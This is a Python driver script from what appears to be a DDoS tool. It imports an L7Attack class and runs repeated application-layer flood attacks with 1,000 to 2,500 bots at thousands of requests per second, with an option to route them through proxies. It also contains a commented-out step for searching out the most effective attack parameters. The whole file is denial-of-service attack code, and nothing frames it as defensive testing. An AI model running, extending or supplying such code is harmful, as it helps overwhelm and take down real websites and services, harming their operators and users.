import asyncio, time
from ddos.attacks.l7_attack import L7Attack
from utils.analyses.l7_analyses import search_best_params


# Test n attack series for search best params
def attack_series(n: int = 10):
    def temp(bc: list, rps: list, proxy: bool):
        for b, r in zip(bc, rps):
            if proxy:
                l7_attack = L7Attack(bots_count=b, rps=r, proxy=proxy)
            else:
                l7_attack = L7Attack(bots_count=b, rps=r)
            for i in range(n):
                asyncio.run(l7_attack.attack())
                time.sleep(10)
        # search_best_params(proxy_flag=proxy)

    bot_count_no_proxy = [1000]
    requests_per_second_no_proxy = [ x*5 for x in bot_count_no_proxy ]
    temp(bot_count_no_proxy, requests_per_second_no_proxy, False)

    time.sleep(1200)

    bot_count_proxy = [2500]
    requests_per_second_proxy = [x * 5 for x in bot_count_proxy]
    temp(bot_count_proxy, requests_per_second_proxy, True)

# Test single attack
def attack(proxy: bool, bots_count: int = 1500, rps: int = 7500):
    if proxy:
        l7_attack = L7Attack(bots_count=bots_count, rps=rps, proxy=proxy)
    else:
        l7_attack = L7Attack(bots_count=bots_count, rps=rps)
    asyncio.run(l7_attack.attack())